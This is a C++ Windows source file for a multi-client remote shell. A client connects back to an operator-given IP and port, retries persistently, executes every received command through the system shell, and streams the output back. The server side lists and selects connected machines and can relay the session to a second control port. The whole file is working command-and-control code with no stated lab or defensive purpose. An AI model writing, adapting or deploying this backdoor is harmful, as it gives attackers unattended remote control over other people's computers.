#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NONSTDC_NO_DEPRECATE

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <direct.h>
#include <thread>
#pragma comment(lib, "ws2_32.lib")
#define MAX_CLIENT_COUNT 10
#define NICKNAME_LEN 1024
#define BUFFER_SIZE 1024
#define ERROR_EXIT(msg) {perror(msg); exit(EXIT_FAILURE);}
#define History_SIZE 4096
char History[History_SIZE];
DWORD WINAPI recv_thread(LPVOID ptr);
int Control_Server_port = 0;
SOCKET sclient;//控制端描述符
int selected = 0;//选择
struct Client
{
    SOCKET s = INVALID_SOCKET;
    SOCKADDR_IN sin;
    char name[NICKNAME_LEN];
    int num = 0;
    char time[13];//12:10:34:345 12
}Cli[MAX_CLIENT_COUNT];

void Tree_Cli() {
    int max_length_Cli_name = 0;
    for (int i = 0; i < MAX_CLIENT_COUNT; i++) {
        if (Cli[i].s == INVALID_SOCKET || Cli[i].num == 0) continue;
        if (strlen(Cli[i].name) > max_length_Cli_name) max_length_Cli_name = strlen(Cli[i].name);
    }
    for (int i = 0; i < MAX_CLIENT_COUNT; i++) {
        if (Cli[i].s == INVALID_SOCKET || Cli[i].num == 0) continue;
        printf(
            "  #%d %*s [%s:%d][%s]\n",
            i + 1,
            -max_length_Cli_name,
            Cli[i].name,
            inet_ntoa(Cli[i].sin.sin_addr),
            ntohs(Cli[i].sin.sin_port),
            Cli[i].time
        );
    }
}
DWORD WINAPI recv_thread(LPVOID ptr)
{
    struct Client* c = (struct Client*)ptr;
    SYSTEMTIME sysTime = { 0 };
    char buffer[BUFFER_SIZE];
    int n;
    while (1)
    {
        memset(buffer, 0, sizeof(buffer));
        n = recv(c->s, buffer, sizeof(buffer), 0);
        if (n <= 0)
        {
            GetSystemTime(&sysTime);
            sprintf(
                buffer,
                "#%d %s [%s:%d][%d:%d:%d:%d][%s]已断开",
                c->num,
                c->name,
                inet_ntoa(c->sin.sin_addr),
                ntohs(c->sin.sin_port),
                sysTime.wHour + 8, sysTime.wMinute, sysTime.wSecond, sysTime.wMilliseconds,
                strerror(errno)
            );
            SetConsoleTitle(buffer);
            if ((strlen(History) + strlen(buffer) + 2) > History_SIZE) {
                memset(History, 0, sizeof(History));
                strcpy(History, buffer);
                strcat(History, "\n\0");
            }
            else {
                strcat(History, buffer);
                strcat(History, "\n\0");
            }
            closesocket(c->s);
            c->num = 0;
            c->s = INVALID_SOCKET;
            return 0;
        }
        if(selected == c->num) printf("%s", buffer); fflush(stdout);
        if (Control_Server_port != 0 && selected == c->num) send(sclient, buffer, strlen(buffer), 0);
    }
}

//接收控制端接口
void Control_Server()
{
    WORD sockVersion = MAKEWORD(2, 2);//请求使用的winsock版本 
    WSADATA wsaData;   // 实际返回的winsock版本  
    //创建socket 
    SOCKET slisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);//参数分别为协议族，类型，协议号 AF_INET代表TCP/IP 
    if (slisten == INVALID_SOCKET) {//异常处理 
        printf("scoket error!");
        return;
    }
    //bind
    sockaddr_in sin; //服务器端点地址 
    sin.sin_family = AF_INET; //协议族
    sin.sin_port = htons(Control_Server_port); //端口号， htons函数将本地字节顺序变为网络字节顺序（16位） 
    sin.sin_addr.S_un.S_addr = INADDR_ANY;//服务器bind时需要使用地址通配
    if (bind(slisten, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR) { //LPSOCKADDR是类型强制转换
        printf("bind error !");
    }
    char* com = new char[1024];
    char buffer[BUFFER_SIZE];
    int Last_selected = 0;
    char title[NICKNAME_LEN];
    int ret = 1;
    int H_Control_Server_port = Control_Server_port;
    while (1) {
        Control_Server_port = H_Control_Server_port;
        if (listen(slisten, 5) == SOCKET_ERROR) { //5为queuesize,缓存区大小
            printf("listen error !");
            return;
        }
        //由于使用的是TCP ，socket stream,要循环接收数据
        sockaddr_in remoteAddr;
        int nAddrlen = sizeof(remoteAddr);
        sclient = accept(slisten, (SOCKADDR*)&remoteAddr, &nAddrlen);//accept会新建一个socket 
        if (sclient == INVALID_SOCKET) {
            printf("accept error !");
            return;
        }
        send(sclient, "console", 8, 0);
        ret = 1;
        while (ret > 0) {
            memset(com, '\0', sizeof(com));
            memset(buffer, '\0', sizeof(buffer));
            int ret = recv(sclient, buffer, sizeof(buffer), 0);
            if (ret > 0) {
                if (strlen(buffer) == 0) continue;
                for (int i = 0; i < strlen(buffer); i++) {
                    if (buffer[i] != ' ') {
                        com[0] = 'B';
                        break;
                    }
                }
                if (com[0] != 'B') continue;
                printf("%s\n", buffer);
            }
            else {
                //控制端断开
                //printf("\n[%d]$ ", selected);
                Control_Server_port = 0;
                break;
            }
            if (strlen(buffer) == 0) {
                printf("[%d]$ ", selected);
                continue;
            }
            if (!strcmp(buffer, "cls")) system("cls");
            if (buffer[0] == '/') {
                int max_length_Cli_name = 0;
                for (int i = 0; i < MAX_CLIENT_COUNT; i++) {
                    if (Cli[i].s == INVALID_SOCKET || Cli[i].num == 0) continue;
                    if (strlen(Cli[i].name) > max_length_Cli_name) max_length_Cli_name = strlen(Cli[i].name);
                }
                for (int i = 0; i < MAX_CLIENT_COUNT; i++) {
                    if (Cli[i].s == INVALID_SOCKET || Cli[i].num == 0) continue;
                    printf(
                        "  #%d %*s [%s:%d][%s]\n",
                        i + 1,
                        -max_length_Cli_name,
                        Cli[i].name,
                        inet_ntoa(Cli[i].sin.sin_addr),
                        ntohs(Cli[i].sin.sin_port),
                        Cli[i].time
                    );
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "  #%d %*s [%s:%d][%s]\n",
                        i + 1,
                        -max_length_Cli_name,
                        Cli[i].name,
                        inet_ntoa(Cli[i].sin.sin_addr),
                        ntohs(Cli[i].sin.sin_port),
                        Cli[i].time
                    );
                    send(sclient, com, strlen(com), 0);
                }
                printf("[%d]$ ", selected);
                memset(com, '\0', sizeof(com));
                sprintf(com, "[%d]$ ", selected);
                send(sclient, com, strlen(com), 0);
                continue;
            }
            if (buffer[0] == '#')
            {
                if (buffer[1] == '#' && buffer[2] == '\0') {
                    History[0] = '\0';
                    printf("[%d]$ ", selected);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "[%d]$ ", selected);
                    send(sclient, com, strlen(com), 0);
                    continue;
                }
                if (buffer[1] == '#') {
                    selected = atoi(buffer + 2);
                    if (Cli[selected - 1].s == INVALID_SOCKET || Cli[selected - 1].num == 0) selected = 0;
                    if (selected == 0) {
                        printf("[%d]$ ", selected);
                        sprintf(com, "[%d]$ \0", selected);
                        send(sclient, com, strlen(com), 0);
                        continue;
                    }
                    closesocket(Cli[selected - 1].s);
                    Cli[selected - 1].s = INVALID_SOCKET;
                    selected = 0;
                    printf("[%d]$ ", selected);
                    sprintf(com, "[%d]$ \0", selected);
                    send(sclient, com, strlen(com), 0);
                    continue;
                }
                if (buffer[1] == '\0') {  //NULL , '\0' ,0 的ASCII码值都是 0 , '0'是48
                    printf("%s", History);
                    send(sclient, History, strlen(History), 0);
                    printf("[%d]$ ", selected);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "[%d]$ ", selected);
                    send(sclient, com, strlen(com), 0);
                    continue;
                }
                selected = atoi(buffer + 1);
                printf("[%d]$ ", selected);
                memset(com, '\0', sizeof(com));
                sprintf(com, "[%d]$ ", selected);
                send(sclient, com, strlen(com), 0);
            }
            else {
                if (Cli[selected - 1].s == INVALID_SOCKET || Cli[selected - 1].num == 0 || (send(Cli[selected - 1].s, buffer, sizeof(buffer), 0) <= 0))
                {
                    printf("[%d]$ ", selected);
                    memset(com, '\0', sizeof(com));
                    sprintf(com, "[%d]$ ", selected);
                    send(sclient, com, strlen(com), 0);
                }
            }
        }
    }
    //控制台返回数据
}

DWORD WINAPI send_thread(LPVOID ptr)
{
    char buffer[BUFFER_SIZE];
    int n;
    int Last_selected = 0;
    char title[NICKNAME_LEN];
    printf("$ ");
    while (1)
    {
        memset(buffer, '\0', sizeof(buffer));
        gets_s(buffer);
        if (strlen(buffer) == 0) {
            if (Cli[selected - 1].s == INVALID_SOCKET || Cli[selected - 1].num == 0) selected = 0;
            printf("[%d]$ ", selected);
            continue;
        }
        if (!strcmp(buffer, "cls")) system("cls");
        if (buffer[0] == '/') {
            if (Cli[selected - 1].s == INVALID_SOCKET || Cli[selected - 1].num == 0) selected = 0;
            Tree_Cli();
            printf("[%d]$ ", selected);
            continue;
        }
        if (buffer[0] == '#')
        {
            if (buffer[1] == '#' && buffer[2] == '\0') {
                History[0] = '\0';
                printf("[%d]$ ", selected);
                continue;
            }
            if (buffer[1] == '#') {
                selected = atoi(buffer + 2);
                if (Cli[selected - 1].s == INVALID_SOCKET || Cli[selected - 1].num == 0) selected = 0;
                if (selected == 0) {
                    printf("[%d]$ ", selected);
                    continue;
                }
                closesocket(Cli[selected - 1].s);
                Cli[selected - 1].s = INVALID_SOCKET;
                selected = 0;
                printf("[%d]$ ", selected);
                continue;
            }
            if (buffer[1] == '\0') {  //NULL , '\0' ,0 的ASCII码值都是 0 , '0'是48
                printf("%s", History);
                if (Cli[selected - 1].s == INVALID_SOCKET || Cli[selected - 1].num == 0) selected = 0;
                printf("[%d]$ ", selected);
                continue;
            }
            Last_selected = selected;
            selected = atoi(buffer + 1);
            if (selected == 0) {
                printf("[%d]$ ", selected);
                continue;
            }
            if (selected < 1 || selected > MAX_CLIENT_COUNT || Cli[selected - 1].s == INVALID_SOCKET)
            {
                Tree_Cli();
                selected = Last_selected;
                printf("[%d]$ ", selected);
                continue;
            }
            else {
                memset(title, '\0', sizeof(title));
                sprintf(
                    title,
                    "#%d %s [%s:%d][%s]\n",
                    selected,
                    Cli[selected - 1].name,
                    inet_ntoa(Cli[selected - 1].sin.sin_addr),
                    ntohs(Cli[selected - 1].sin.sin_port),
                    Cli[selected - 1].time
                );
                SetConsoleTitle(title);
                printf("[%d]$ ", selected);
            }
        }
        else
        {
            if (selected == 0)
            {
                printf("[%d]$ ", selected);
                continue;
            }
            else
            {
                n = send(Cli[selected - 1].s, buffer, sizeof(buffer), 0);
                if (n <= 0)
                {
                    closesocket(Cli[selected - 1].s);
                    Cli[selected - 1].s = INVALID_SOCKET;
                    selected = 0;
                    printf("[%d]$ ", selected);
                }
                else {
                    strcat(buffer, "\n");
                    if (Control_Server_port != 0) send(sclient, buffer, strlen(buffer), 0);
                }
            }
        }
    }
    return 0;
}
DWORD WINAPI Server_Loop_Send(LPVOID lp)
{
    while (1) {
        Sleep(200000);
        for (int i = 0; i < MAX_CLIENT_COUNT; i++) {
            if (Cli[i].s == INVALID_SOCKET || Cli[i].num == 0) continue;
            send(Cli[i].s, " ", strlen(" "), 0);
        }
    }
    return 0;
}
int main(int argc, char* argv[])
{
    if (argc == 1) {
        char Current_path[MAX_PATH];
        char* pwd = getcwd(Current_path, MAX_PATH);
        printf("[%s]$ ", Current_path);
        return 0;
    }
    WSADATA wsaData;
    int ws = WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) ERROR_EXIT("socket error");
    SOCKADDR_IN addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    char Cli_num[25];
    if (argc == 2 && (argv[1][2] == 'h' || argv[1][0] < '0' || argv[1][0] > '9')) {
        printf("Usage: %s [port] server mode\n", argv[0]);
        printf("   or: %s [ip] [port] [name ]client mode\n", argv[0]);
        printf("  and: #[num]: Select user ##[num]: disconnect User\n");
        printf("  and: /: Traverse the client #: View historical connection\n");
        return 0;
    }
    if (argc == 2 || argc == 3) // server mode
    {
        if (argc == 3) Control_Server_port = atoi(argv[2]);
        if (Control_Server_port != 0) {
            std::thread c(Control_Server); // 创建发送消息的线程
            c.detach();
        }
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(atoi(argv[1]));
        if (bind(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) ERROR_EXIT("bind error");
        if (listen(sock, SOMAXCONN) == SOCKET_ERROR) ERROR_EXIT("listen error");
        int len, i;
        for (i = 0; i < MAX_CLIENT_COUNT; i++) Cli[i].s = INVALID_SOCKET;
        for (i = 0; i < MAX_CLIENT_COUNT; i++) Cli[i].num = 0;
        HANDLE hThread;
        DWORD ThreadID;
        hThread = CreateThread(NULL, 0, send_thread, NULL, 0, &ThreadID);
        if (hThread == NULL) ERROR_EXIT("CreateThread error");
        CloseHandle(hThread);
        CloseHandle(CreateThread(NULL, 0, Server_Loop_Send, NULL, 0, &ThreadID));
        char title[NICKNAME_LEN];
        while (1)
        {
            for (i = 0; i < MAX_CLIENT_COUNT; i++) {
                if (Cli[i].s == INVALID_SOCKET) break;
                if (Cli[i].num == 0) break;
            }
            if (i == MAX_CLIENT_COUNT)
            {
                SetConsoleTitle("Server IS FULL\n");
                Sleep(5000);
                continue;
            }
            len = sizeof(Cli[i].sin);
            Cli[i].s = accept(sock, (SOCKADDR*)&Cli[i].sin, &len);
            if (Cli[i].s == INVALID_SOCKET)
            {
                printf("accept error\n");
                continue;
            }
            Cli[i].num = i + 1;
            memset(Cli[i].name, '\0', sizeof(Cli[i].name));
            if (recv(Cli[i].s, Cli[i].name, sizeof(Cli[i].name), 0) <= 0)
            {
                SetConsoleTitle("RECV NAME ERROR");
                closesocket(Cli[i].s);
                Cli[i].num = 0;
                Cli[i].s = INVALID_SOCKET;
                Sleep(5000);
                continue;
            }
            memset(Cli_num, 0, sizeof(Cli_num));
            itoa(i + 1, Cli_num, 10);
            if (send(Cli[i].s, Cli_num, strlen(Cli_num), 0) <= 0) {
                SetConsoleTitle("Send Cli_num error");
                closesocket(Cli[i].s);
                Cli[i].num = 0;
                Cli[i].s = INVALID_SOCKET;
                continue;
                Sleep(5000);
            }
            SYSTEMTIME sysTime = { 0 };
            GetSystemTime(&sysTime);
            memset(title, '\0', sizeof(title));
            sprintf(title, "%d:%d:%d:%d", sysTime.wHour + 8, sysTime.wMinute, sysTime.wSecond, sysTime.wMilliseconds);
            memset(Cli[i].time, '\0', sizeof(Cli[i].time));
            strcpy(Cli[i].time, title);
            sprintf(
                title,
                "#%d %s [%s:%d][%d:%d:%d:%d] 已连接",
                Cli[i].num,
                Cli[i].name,
                inet_ntoa(Cli[i].sin.sin_addr),
                ntohs(Cli[i].sin.sin_port),
                sysTime.wHour + 8,
                sysTime.wMinute,
                sysTime.wSecond,
                sysTime.wMilliseconds
            );
            SetConsoleTitle(title);
            if ((strlen(History) + strlen(title) + 2) > History_SIZE) {
                memset(History, 0, sizeof(History));
                strcpy(History, title);
                strcat(History, "\n\0");
            }
            else {
                strcat(History, title);
                strcat(History, "\n\0");
            }
            hThread = CreateThread(NULL, 0, recv_thread, &Cli[i], 0, &ThreadID);
            if (hThread == NULL) ERROR_EXIT("CreateThread error");
            CloseHandle(hThread);
        }
    }
    else if (argc == 4) // client mode
    {
        FILE* fp = NULL;
        char buffer[BUFFER_SIZE];
        char com[BUFFER_SIZE];
        char mony[256] = "$ ";
        if (strlen(argv[3]) > 256) ERROR_EXIT("Parameter 3 Exceeds the length");
        while (1) {
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                printf("invalid socket!");
                return 0;
            }
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = inet_addr(argv[1]);
            addr.sin_port = htons(atoi(argv[2]));
            while (connect(sock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
                SetConsoleTitle("CONNECT . . . .");
                Sleep(200000);
                continue;
            }
            memset(buffer, '\0', sizeof(buffer));
            strcpy(buffer, argv[3]);
            if (send(sock, buffer, sizeof(buffer), 0) <= 0) ERROR_EXIT("send error");
            memset(buffer, '\0', sizeof(buffer));
            if (recv(sock, buffer, sizeof(buffer), 0) <= 0) { // && errno != EINTR
                closesocket(sock);
                strcpy(buffer, "[");
                strcat(buffer, strerror(errno));
                strcat(buffer, "] RECV . . . .");
                Sleep(60000);
                continue;
            }
            else {
                sprintf(com, "#%s %s %s %s", buffer, argv[1], argv[2], argv[3]);
                SetConsoleTitle(com);
                printf("\r                                                         \r$ ");
            }
            while (1)
            {
                memset(buffer, '\0', sizeof(buffer));
                memset(com, '\0', sizeof(com));
                if (recv(sock, buffer, sizeof(buffer), 0) <= 0) {
                    closesocket(sock);
                    strcpy(buffer, "[");
                    strcat(buffer, strerror(errno));
                    strcat(buffer, "] RECV . . .");
                    SetConsoleTitle(buffer);
                    Sleep(5000);
                    break;
                }
                if (strlen(buffer) == 0) continue;
                for (int i = 0; i < strlen(buffer); i++) {
                    if (buffer[i] != ' ') {
                        com[0] = 'B';
                        break;
                    }
                }
                if (com[0] != 'B') continue;
                printf("%s\n", buffer);
                if (!strcmp(buffer, "cls")) {
                    system("cls");
                    strcpy(com, _pgmptr);
                }
                else {
                    strcpy(com, buffer);
                    strcat(com, " 2>&1&echo;&");
                    strcat(com, _pgmptr);
                }
                memset(buffer, '\0', sizeof(buffer));
                fp = _popen(com, "r");
                if (!fp) {
                    perror("popen");
                    exit(EXIT_FAILURE);
                }
                if (!fp) {
                    return 1;
                }
                while (fgets(buffer, sizeof(buffer) - 1, fp) != 0) {
                    printf("%s", buffer);
                    if (send(sock, buffer, strlen(buffer), 0) <= 0) ERROR_EXIT("send error");
                }
                buffer[strlen(buffer) - 3] = '\0';
                memcpy(mony, buffer + 1, strlen(buffer) - 1);
                SetCurrentDirectoryA(mony);
                memset(mony, '\0', sizeof(mony));
                _pclose(fp);
            }
        }
    }
    else {
        char Current_path[MAX_PATH];
        char* pwd = getcwd(Current_path, MAX_PATH);
        printf("[%s]$ ", Current_path);
        exit(EXIT_FAILURE);
        closesocket(sock);
    }
    WSACleanup();
    return 0;
}
